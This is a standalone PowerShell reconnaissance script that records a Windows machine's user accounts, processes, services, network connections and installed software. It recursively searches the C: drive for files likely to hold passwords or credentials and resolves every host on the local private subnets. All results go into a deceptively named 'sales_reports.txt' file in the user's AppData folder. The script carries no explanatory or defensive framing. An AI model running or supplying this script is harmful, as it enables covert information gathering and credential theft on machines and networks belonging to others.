# DETAILED LOCAL USER ACCOUNT INFORMATION
echo "DETAILED LOCAL USER ACCOUNT INFORMATION" >> $env:APPDATA\sales_reports.txt
Get-LocalUser | Format-List -Property * >> $env:APPDATA\sales_reports.txt

# DETAILED PROCESS INFORMATION
echo "DETAILED PROCESS INFORMATION" >> $env:APPDATA\sales_reports.txt
Get-Process | Format-List -Property * >> $env:APPDATA\sales_reports.txt

# DETAILED SERVICE INFORMATION
echo "DETAILED SERVICE INFORMATION" >> $env:APPDATA\sales_reports.txt
Get-Service | Where-Object Status -eq "Running" | Format-List -Property * >> $env:APPDATA\sales_reports.txt

# DETAILED NETWORK CONNECTION INFORMATION
echo "DETAILED NETWORK CONNECTION INFORMATION" >> $env:APPDATA\sales_reports.txt
Get-NetTCPConnection | Format-List * >> $env:APPDATA\sales_reports.txt
Get-NetUDPEndpoint | Format-Table LocalAddress,LocalPort,OwningProcess >> $env:APPDATA\sales_reports.txt

# INSTALLED SOFTWARE
echo "INSTALLED SOFTWARE" >> $env:APPDATA\sales_reports.txt
gci 'C:\Program Files\' >> $env:APPDATA\sales_reports.txt
gci 'C:\Program Files (x86)\' >> $env:APPDATA\sales_reports.txt
gci 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall' >> $env:APPDATA\sales_reports.txt

# SENSITIVE FILES
echo "SENSITIVE FILES" >> $env:APPDATA\sales_reports.txt
gci C:\ -Include *pass*.txt,*pass*.xml,*pass*.ini,*pass*.xlsx,*cred*,*vnc*,*.config*,*accounts* -File `
	-Recurse `
	-EA SilentlyContinue >> $env:APPDATA\sales_reports.txt
	
# HOSTS ON THE SAME SUBNET
echo "HOSTS ON THE SAME SUBNET" >> $env:APPDATA\sales_reports.txt
$IPv4Addresses=Get-NetIPAddress -AddressFamily "IPv4" | Where-Object {($_ -like '10.*') -or ($_ -like '192.168.*') -or ($_ -like '172.*')}
foreach ($ip in $IPv4Addresses) {
	$IPPrefix=($ip.IPAddress.split(".")[0,1,2] -join ".") 
	for ($i=1; $i -lt 255; $i++) {
		$SearchIP=($IPPrefix+"."+$i)
		try {
			$Hostname=[System.Net.Dns]::GetHostEntry($SearchIP).Hostname
			echo $SearchIP":"$Hostname >> $env:APPDATA\sales_reports.txt
		}
		catch {
			Continue
		}
	}
}
